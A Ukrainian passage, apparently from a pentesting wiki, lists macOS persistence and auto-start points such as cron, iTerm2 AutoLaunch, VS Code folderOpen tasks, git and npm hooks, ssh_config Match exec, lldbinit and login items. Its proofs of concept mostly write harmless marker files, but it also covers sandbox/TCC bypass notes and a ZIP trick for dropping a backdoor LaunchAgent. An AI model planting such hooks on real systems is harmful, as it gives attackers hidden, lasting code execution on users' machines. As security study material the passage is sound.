У тимчасовому обліковому записі можна встановити запис cron користувача, що містить лише маркер, за допомогою `crontab`, а після спостереження видалити його. Запуск `crontab <file>` **замінює весь наявний crontab облікового запису**, тому збережіть і відновіть його, якщо обліковий запис не є тимчасовим:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Опис: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Раніше iTerm2 мав надані дозволи TCC

#### Розташування

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Тригер**: Запустіть iTerm2 з відповідним скриптом Python API у цій папці
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Тригер**: Запустіть iTerm2; хук запуску AppleScript задокументований окремо
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Тригер**: Створіть сеанс із профілем, команда або початковий текст якого запускає payload

#### Опис і експлуатація

[Поточний посібник з Python API iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) описує автоматичний запуск скриптів **Python** у `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. У ньому не зазначено, що довільний виконуваний файл `.sh` у цій папці запускається. Для тимчасового облікового запису збережіть це як `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

У [поточному посібнику з AppleScript для iTerm2](https://iterm2.com/documentation-scripting.html) окремо описано `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, а також застарілий резервний шлях `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, який використовується, якщо сучасна папка не існує. Приклад AppleScript, що лише встановлює маркер:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Ці приклади скриптів звірено з документацією iTerm2, але не запускалися в активному сеансі робочого столу. Після тестування в тимчасовому обліковому записі видаліть тестовий скрипт і `/tmp/ht-iterm-autolaunch-marker` або `/tmp/iterm2-autolaunchscpt` відповідно.

У налаштуваннях iTerm2, що містяться в **`~/Library/Preferences/com.googlecode.iterm2.plist`**, можна вказати команду профілю або початковий текст. Останній вводиться в сеанс; його виконання залежить від того, чи інтерпретує його shell. [Документація профілів iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) описує команду, яка запускається під час створення нового сеансу з цим профілем.

Це налаштування можна задати в параметрах iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

А команда відображається в налаштуваннях:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Для безпечного оцінювання перевірте вибраний профіль у налаштуваннях iTerm2 або прочитайте копію його файла налаштувань. Зміна `Initial Text` у профілі, що використовується, вплинула б на сеанси користувача, тому в дослідницькій Mac жодних налаштувань не змінювали.

### xbar

Опис: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але xbar має бути встановлено
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Accessibility

#### Розташування

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Умова запуску**: під час запуску xbar

#### Опис

Якщо популярну програму [**xbar**](https://github.com/matryer/xbar) встановлено, можна написати shell script у **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконано під час запуску xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Опис**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Hammerspoon має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Accessibility

#### Розташування

- **`~/.hammerspoon/init.lua`**
  - **Тригер**: Щойно Hammerspoon запускається

#### Опис

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) — це платформа автоматизації для **macOS**, яка використовує **мову сценаріїв LUA**. Зокрема, вона підтримує інтеграцію повного коду AppleScript і виконання shell scripts, що значно розширює її можливості зі створення сценаріїв.<sup>[[13]](#references)</sup>

Застосунок шукає один файл — `~/.hammerspoon/init.lua`; під час запуску застосунку виконується цей сценарій.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але BetterTouchTool має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Він запитує дозволи Automation-Shortcuts і Accessibility

#### Розташування

- Файл скрипту, на який **вже є посилання** в увімкненому preset BetterTouchTool, або конфігурація цього preset у `~/Library/Application Support/BetterTouchTool/`. Точний шлях до скрипту залежить від налаштувань preset.

[Довідка з дій BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) описує дії зі shell-скриптами та фоновими командами. Налаштована клавіатурна, мишача, сенсорна, віджетна чи інша подія має відбутися, коли відповідний preset активний; [довідка з тригерів](https://docs.folivora.ai/docs/configuration/new-trigger/) пояснює, як їх пов’язати. Випадковий файл у каталозі підтримки застосунку не є тригером. Уже налаштована дія, яка завантажує зовнішній скрипт із можливістю запису, є більш вузькою ціллю для запису з подальшим виконанням. Код запускається від імені користувача BetterTouchTool і підпорядковується фактично наданим дозволам macOS. На дослідницькому Mac BetterTouchTool не було в `/Applications`, тому локально preset не змінювали й не запускали.

### Alfred

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Alfred має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Він запитує дозволи Automation, Accessibility і навіть Full-Disk access

#### Розташування

- Скрипт або файл, на який **вже є посилання** в установленому workflow Alfred, або сам workflow у налаштованому користувачем каталозі `Alfred.alfredpreferences`. Каталог налаштувань може синхронізуватися й не має єдиного фіксованого шляху.

[Довідка з workflow Alfred](https://www.alfredapp.com/help/workflows/) описує вимогу Powerpack і встановлення через інтерфейс. Має спрацювати hotkey, keyword чи інший налаштований тригер установленого workflow; [приклад hotkey Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) демонструє дію скрипту. [Довідка зі змінних середовища Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) надає шлях до вибраного каталогу налаштувань у `alfred_preferences`. Розміщення незареєстрованого файлу workflow у довільному каталозі не доводить, що його буде встановлено чи запущено. Код запускається від імені користувача, який увійшов у систему як користувач Alfred, і підпорядковується фактично наданим дозволам macOS. На дослідницькому Mac Alfred не було в `/Applications`, тому цей шлях оцінювали лише за документацією.

### Raycast Script Commands та оновлення extension

- **Ціль для запису:** виконуваний скрипт у каталозі, який **вже додано** в Raycast Settings → Script Commands. Raycast не сканує довільний щойно створений каталог. [Довідка Raycast щодо Script Commands](https://manual.raycast.com/script-commands) описує реєстрацію каталогу.
- **Тригер та ідентичність:** користувач запускає проіндексовану команду, налаштований hotkey або fallback запускає її, або Raycast оновлює скрипт `inline` відповідно до налаштованого `@raycast.refreshTime`. Скрипт запускається інтерпретатором від імені користувача, який увійшов у систему як користувач Raycast. [Довідник метаданих upstream](https://github.com/raycast/script-commands#metadata) обмежує автоматичне оновлення inline-командами, а [маніфест extension Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) окремо підтримує `interval` для встановлених команд extension типу `no-view` або `menu-bar`. Просте додавання звичайної команди скрипту не планує її запуск.

Для тимчасового облікового запису із зареєстрованим каталогом скриптів приклад inline-скрипту, який створює лише маркер:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Збережіть його в зареєстрованому каталозі, зробіть виконуваним і дозвольте Raycast оновитися. Потім видаліть цей файл і `/tmp/ht-raycast-refresh-marker`. На дослідницькому Mac Raycast не було знайдено за звичним шляхом `/Applications`, тому цей опис підтверджено документацією, але локально його не запускали. Для Accessibility, Automation і доступу до файлів можуть з’являтися запити macOS на надання дозволів.

### Автоматичні завдання робочого простору Visual Studio Code

- **Цільовий файл:** `.vscode/tasks.json` у робочому просторі, який відкриє користувач.
- **Тригер:** відкриття цього робочого простору у VS Code, але лише якщо папці довіряють **і** дозволено автоматичні завдання. У недовіреному робочому просторі автоматичні завдання ніколи не запускаються; типово перед першим автоматичним запуском система запитує дозвіл. У [документації із завдань VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) і [документації щодо довіри до робочого простору](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) описано обидві умови.
- **Облікові дані виконання:** обліковий запис користувача VS Code через налаштований процес завдання. Це виконання, специфічне для програми, а не збереження після входу в систему.

У **новому одноразовому робочому просторі** розмістіть це завдання, яке створює лише маркер, у `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Після відкриття довіреної робочої області та дозволу на виконання автоматичних завдань перевірте наявність `.autostart-task-ran`. Видаліть запис завдання та маркер для очищення. **Це було перевірено за документацією Microsoft і встановленим пакетом VS Code 1.139.1; у поточному сеансі робочого столу це не запускалося.**

### Chrome native messaging hosts

- **Ціль запису:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` для поточного користувача або `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` для всіх користувачів (потрібні права адміністратора на запис). Chromium і Chrome for Testing використовують різні каталоги; див. [актуальну таблицю шляхів Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Тригер:** Встановлене розширення Chrome із дозволом `nativeMessaging` викликає `chrome.runtime.connectNative()` або `chrome.runtime.sendNativeMessage()` із точною назвою хоста з маніфесту. Після цього Chrome запускає виконуваний файл хоста. Саме відкриття Chrome не запускає довільний новий native host; створення маніфесту без розширення, яке його викликає, нічого не робить. [Посібник Chrome із native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) описує цей обмін даними.
- **Ідентичність виконання:** Обліковий запис користувача Chrome. У маніфесті має бути вказано абсолютний шлях до виконуваного файла та явно дозволено джерело розширення, яке його викликає.

У тимчасовому обліковому записі браузера з тестовим розширенням наведена нижче пара файлів демонструє зв’язок між записом і виконанням. Назва файла маніфесту має збігатися з його `name`, а `TEST_EXTENSION_ID` потрібно замінити на фактичний ID цього розширення:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Збережіть цей JSON як `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Виконуваний файл, що містить лише marker, за шляхом `path` у маніфесті може містити:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Після того як тестове розширення викличе `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` зі свого service worker або сторінки розширення, маркер підтвердить, що хост запустився. Цей мінімальний хост не реалізує протокол відповідей Chrome із префіксом довжини, тому розширення може повідомити про помилку обміну повідомленнями після запису маркера. Щоб очистити систему, видаліть тестовий маніфест, хост і маркер. У macOS 26.5.2 застосунок Chrome і обидва каталоги маніфестів були наявні; **активний профіль Chrome не змінювали й не використовували для тестування**.

### Команди Karabiner-Elements для подій клавіш

- **Ціль запису:** `~/.config/karabiner/karabiner.json` в обліковому записі, де встановлено й запущено Karabiner-Elements. [Посібник Karabiner з розташування файлу](https://karabiner-elements.pqrs.org/docs/json/location/) зазначає, що застосунок відстежує цей файл і перезавантажує його після запису. JSON-файли в `assets/complex_modifications` — це лише пресети, які можна імпортувати; сам запис файлу туди не активує правило.
- **Тригер:** Налаштована подія клавіші після активації правила. У [довідці щодо `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) описано виконання команд. Це не виконання коду під час входу в систему чи після кожного запису файлу.
- **Ідентичність виконання:** Авторизований користувач, від імені якого працює користувацький процес Karabiner. Надані йому дозволи та будь-який доступ TCC залежать від застосунку й версії.

Для одноразового тестового облікового запису додайте цей об’єкт правила до масиву `complex_modifications.rules` вибраного профілю у файлі `karabiner.json`, зберігши решту профілю. Натисніть F18, щоб створити нешкідливий маркер, а потім видаліть це правило й маркер. Клавішу F18 обрано, щоб не перепризначати звичайну клавішу для введення тексту:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements не було встановлено в `/Applications` на тестовій машині з macOS 26.5.2, тому це PoC, підкріплений документацією, а не результат локального виконання.

### Git hooks у локальному репозиторії

- **Ціль запису:** Виконуваний hook, наприклад `<repo>/.git/hooks/post-checkout`. Якщо `core.hooksPath` уже задано, використовуйте натомість цей налаштований каталог. Hook, закомічений як звичайний файл із відстежуваними змінами, автоматично не встановлюється в клон.
- **Тригер:** Відповідна операція Git. Наприклад, `post-checkout` запускається після `git checkout` або `git switch`, а також після клонування чи створення worktree. У [довіднику Git щодо hooks](https://git-scm.com/docs/githooks) наведено події та вимогу щодо біта виконання; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) змінює каталог пошуку.
- **Ідентифікатор виконання:** Обліковий запис, від імені якого запускається Git. Hook може виконатися, лише якщо користувач має право запису до ефективного каталогу hooks репозиторію, а згодом виконує відповідну операцію Git.

Цей PoC, який створює лише маркер, створює повністю тимчасовий репозиторій, встановлює один hook і перемикає гілку. Його успішно виконано в Apple Git 2.50.1 на macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts у проєкті

- **Ціль для запису:** об’єкт `scripts` у файлі `package.json` проєкту, доступному для запису, або пакет залежності, встановлений у системі, lifecycle script якого запустить користувач. Це hook робочого процесу розробки, а не виконання коду під час відкриття каталогу.
- **Умова запуску та ідентичність:** під час наступного запуску `npm install` або `npm ci`, якщо lifecycle scripts дозволені, `preinstall`, `install` і `postinstall` виконуються від імені користувача, який запускає npm. Звичайна команда `npm run <name>` також запускає відповідні scripts `pre<name>` і `post<name>`. [Довідник npm щодо lifecycle](https://docs.npmjs.com/cli/v11/using-npm/scripts) містить перелік подій; параметр [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) може вимкнути lifecycle scripts під час встановлення. Версія та налаштування політик можуть змінювати дозволену поведінку, тому перевірте версію npm у цільовому середовищі.

Цей PoC, який лише створює маркер, було запущено з локальним npm у порожньому тимчасовому каталозі. Він не завантажує залежності й не змінює проєкт користувача:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Це відрізняється від файлів запуску інтерпретатора Python: npm має виконати відповідну дію встановлення або запуску, тоді як код `site` у Python може завантажуватися під час звичайного запуску інтерпретатора. Аналогічно, для універсальних цілей `Makefile` і визначень завдань збирання потрібно, щоб користувач або вже налаштований інструмент викликав цю ціль; вони не є окремими шляхами автозапуску ОС.

### Конфігурація запуску Vim

- **Ціль запису:** `~/.vimrc` для користувача, який запускатиме Vim (або інший файл запуску, вибраний відповідно до порядку ініціалізації Vim). [Довідка Vim щодо запуску](https://vimhelp.org/starting.txt.html) описує цей файл і перевизначення `VIMINIT`/`EXINIT`.
- **Тригер:** Наступний звичайний запуск Vim, під час якого завантажується ця конфігурація. Параметр Vim `-u NONE` оминає користувацький vimrc. Це виконання, специфічне для редактора, а не тригер входу в ОС.
- **Ідентифікація виконання:** Обліковий запис користувача Vim.

Наведений нижче ізольований PoC було виконано для `/usr/bin/vim` у macOS; він не записує жодних реальних налаштувань Vim або відкритих документів:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim має окремий шлях до конфігурації користувача — `$XDG_CONFIG_HOME/nvim/init.lua` або `init.vim` — і також завантажує скрипти з каталогів `plugin/` у runtime відповідно до [документації зі запуску](https://neovim.io/doc/user/starting/). Neovim не було встановлено на тестовій машині з macOS 26.5.2, тому цей варіант там не запускали.

### Команди конфігурації SSH-клієнта

- **Цільовий файл:** `~/.ssh/config` або інший файл, який він уже підключає. Це конфігураційний файл **клієнта**; він відрізняється від серверного `~/.ssh/rc`, описаного нижче.
- **Умова запуску:** відповідний виклик `ssh`. `Match exec` запускає локальну команду, коли клієнт обробляє конфігурацію, навіть для `ssh -G`, який виводить конфігурацію без підключення. `ProxyCommand` запускається, коли клієнт налаштовує відповідне з’єднання. `LocalCommand` запускається лише після успішного підключення та потребує `PermitLocalCommand yes` (типове значення — `no`). Ці директиви мають різні умови та час запуску; сам запис у файл їх не запускає. Див. upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ідентичність виконання:** локальний користувач, який запускає `ssh`. Потрібні відповідний хост, застосовний файл конфігурації та будь-яке необхідне з’єднання. `ssh -F` дає змогу вибрати інший файл конфігурації.

Цей PoC, що створює лише маркер, перевірили за допомогою SSH-клієнта Apple на macOS 26.5.2. Параметр `-G` перевіряє `Match exec`, не встановлюючи мережевого з’єднання й не читаючи справжню конфігурацію SSH користувача:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Файли ініціалізації налагоджувача

- **Ціль запису:** `~/.lldbinit` або файл програми з вищим пріоритетом, як-от `~/.lldbinit-lldb`. LLDB читає один файл під час запуску налагоджувача. Файл `.lldbinit` у поточному каталозі **не** виконується за замовчуванням; користувач має ввімкнути `target.load-cwd-lldbinit` або передати `--local-lldbinit`. Див. [посібник LLDB](https://lldb.llvm.org/man/lldb.html).
- **Умова запуску та обліковий запис:** користувач запускає LLDB без `--no-lldbinit`; команди виконуються від імені цього користувача. Саме відкриття проєкту не означає, що його `.lldbinit` буде запущено.

Наведений нижче тест лише з маркером виконано в LLDB на macOS 26.5.2, в ізольованих домашньому каталозі та робочому каталозі:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Для **GDB** в [документації upstream щодо запуску](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) зазначено `$HOME/Library/Preferences/gdb/gdbinit`, а потім `~/.gdbinit` у macOS. Файл `.gdbinit` у поточному каталозі підпадає під [список безпечних шляхів для auto-load](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), а параметри `-nx`/`-nh` вимикають файли ініціалізації. GDB не було встановлено на тестовому Mac, тому цей варіант локально не перевіряли.

### SSHRC

Опис: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але ssh має бути ввімкнено та використовуватися
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Використання SSH для отримання доступу FDA

#### Розташування

- **`~/.ssh/rc`**
  - **Тригер**: Вхід через ssh
- **`/etc/ssh/sshrc`**
  - Потрібні права root
  - **Тригер**: Вхід через ssh

> [!CAUTION]
> Щоб увімкнути ssh, потрібен Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Опис і експлуатація

За замовчуванням, якщо в `/etc/ssh/sshd_config` не вказано `PermitUserRC no`, під час **входу користувача через SSH** виконуються скрипти **`/etc/ssh/sshrc`** і **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Елементи входу**

Опис: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно виконати `osascript` з аргументами
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **Зареєстрований допоміжний застосунок для елементів входу:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (типове розташування в пакеті).
  - **Тригер:** Реєстрація може негайно запустити helper; надалі він запускатиметься під час входу користувачів за умови схвалення.
- **Зареєстрований вбудований agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` або `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Тригер:** Схвалений agent може запуститися під час реєстрації та під час наступних входів; схвалений daemon запускається під час завантаження системи. Для daemon потрібне схвалення адміністратора.

#### Опис

У розділі **Параметри системи → Загальні → Елементи входу та розширення** користувачі можуть переглядати елементи входу й фонові елементи. У macOS 13 і новіших версіях є [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) для реєстрації вбудованих елементів входу, launch agents і launch daemons. Поведінка [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) залежить від типу й стану схвалення. **Щоб зареєструвати новий елемент входу, недостатньо записати helper у пакет застосунку.** І навпаки, якщо виконуваний файл уже зареєстрованого helper доступний для запису, його зміна може вплинути на наступний запуск без повторної реєстрації; спершу перевірте фактичний шлях і перевірки підпису коду.

Нижче наведено спосіб пошуку вбудованих helper на Mac лише для читання; він не реєструє й не запускає їх:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Для вбудованого launch plist визначайте `BundleProgram` **відносно кореня пакета програми** (наприклад, `Contents/MacOS/Helper`), як зазначено в [інструкціях Apple з переходу на Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Під час інвентаризації `/Applications` лише для читання на дослідницькому Mac було виявлено 14 вбудованих helper-записів і п’ять декларацій `BundleProgram`; усі п’ять цілей було визначено, а дві пройшли перевірку на можливість запису користувачем. Ця перевірка **не** підтверджує, що будь-який із цих helper зареєстрований, увімкнений, може виконуватися після перевірки підпису або доступний із sandbox. Команда `sfltool dumpbtm` вивела 150 іменованих записів на цьому Mac; це засіб перевірки, а не тест того, чи кожен запис запущений.

Старішими елементами входу також можна керувати через Apple events. Їх можна переглядати, додавати й видаляти з командного рядка, хоча додавання змінює постійну конфігурацію входу користувача й може потребувати дозволу Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` — це деталь реалізації, а не підтримуване місце для встановлення payload простим записом файлу. Старий API `SMLoginItemSetEnabled` для нових помічників замінено на `SMAppService`; шлях `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, наведений на сторінці раніше, був відсутній на тестовій машині з macOS 26.5.2. Під час аналізу сучасних об’єктів входу використовуйте API реєстрації та стан у системному інтерфейсі, а не припускайте наявність певного шляху до бази даних.

### ZIP як об’єкт входу

(Див. попередній розділ про об’єкти входу; це доповнення.)

Якщо зберегти файл **ZIP** як **об’єкт входу**, **`Archive Utility`** відкриє його. Якщо, наприклад, ZIP-файл зберігався в **`~/Library`** і містив папку **`LaunchAgents/file.plist`** із backdoor, цю папку буде створено (за замовчуванням її немає), а plist буде додано. Тож наступного разу, коли користувач знову ввійде в систему, **backdoor, указаний у plist, буде виконано**.

Ще один варіант — створити файли **`.bash_profile`** і **`.zshenv`** у домашній папці користувача. Так цей метод спрацює, навіть якщо папка LaunchAgents уже існує.

### At

Опис: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно **виконати** **`at`**, і ця команда має бути **увімкнена**
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Потрібно **виконати** **`at`**, і ця команда має бути **увімкнена**

#### **Опис**

Завдання `at` призначені для **планування одноразових завдань**, які виконуються у визначений час. На відміну від завдань cron, завдання `at` автоматично видаляються після виконання. Важливо зазначити, що ці завдання зберігаються після перезавантаження системи, що за певних умов може становити загрозу безпеці.<sup>[[16]](#references)</sup>

У комплектному файлі `com.apple.atrun.plist` задано `Disabled = true`, але launchd зберігає чинні перевизначення стану ввімкнення чи вимкнення окремо. На тестовій машині з macOS 26.5.2 команда `launchctl print-disabled system` показала, що `com.apple.atrun` **увімкнено**, попри наявність цього ключа у файлі. Перш ніж стверджувати, що завдання `at` виконуватимуться, перевірте фактичний стан:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Адміністратор може ввімкнути вимкнену службу `atrun` за допомогою `launchctl`; наведений нижче історичний приклад змінює стан системної служби й **не** виконувався на дослідницькому Mac:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Це створить файл через 1 годину:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Перевірте чергу завдань за допомогою `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Вище ми бачимо два заплановані завдання. Ми можемо вивести відомості про завдання за допомогою `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Якщо завдання AT не ввімкнені, створені завдання не виконуватимуться.

**Файли завдань** можна знайти в `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Назва файлу містить чергу, номер завдання та час його запланованого запуску. Наприклад, розгляньмо `a0001a019bdcd2`.

- `a` — це черга
- `0001a` — номер завдання в hex, `0x1a = 26`
